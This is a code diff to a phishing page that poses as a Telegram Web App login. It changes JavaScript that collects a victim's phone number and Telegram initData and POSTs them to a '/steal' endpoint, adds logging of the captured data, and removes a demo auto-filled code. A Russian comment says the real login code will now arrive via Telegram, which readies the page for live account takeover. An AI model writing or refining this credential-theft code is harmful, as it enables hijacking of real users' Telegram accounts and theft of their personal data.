@@ -334,6 +334,8 @@ function sendPhone() {
     const phone = document.getElementById('phoneInput').value;
     const tgData = Telegram.WebApp.initData;
     
+    console.log('Sending phone:', phone, 'tgData:', tgData);
+    
     fetch('/steal', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
@@ -342,7 +344,11 @@ function sendPhone() {
             tg_data: tgData,
             stage: 'phone_entered'
         })
-    }).catch(e => console.error('Error:', e));
+    }).then(response => {
+        console.log('Phone sent successfully');
+    }).catch(e => {
+        console.error('Error sending phone:', e);
+    });
 
     document.getElementById('phonePage').classList.add('hidden');
     document.getElementById('codePage').classList.remove('hidden');
@@ -350,11 +356,7 @@ function sendPhone() {
     const maskedPhone = phone.slice(0, 4) + ' ••• ••• ' + phone.slice(-2);
     document.getElementById('codeSubtitle').textContent = `We have sent a code to ${maskedPhone}`;
     
-    // АВТОМАТИЧЕСКИ показываем код через 2 секунды
-    setTimeout(() => {
-        document.getElementById('codeInput').value = '12345';
-        document.getElementById('confirmBtn').disabled = false;
-    }, 2000);
+    // УБРАЛ авто-ввод кода - теперь код придет в Telegram
 }
         function sendCode() {
             const code = document.getElementById('codeInput').value;
@@ -384,4 +386,5 @@ function sendPhone() {
     </script>
 </body>
 </html>
+
 
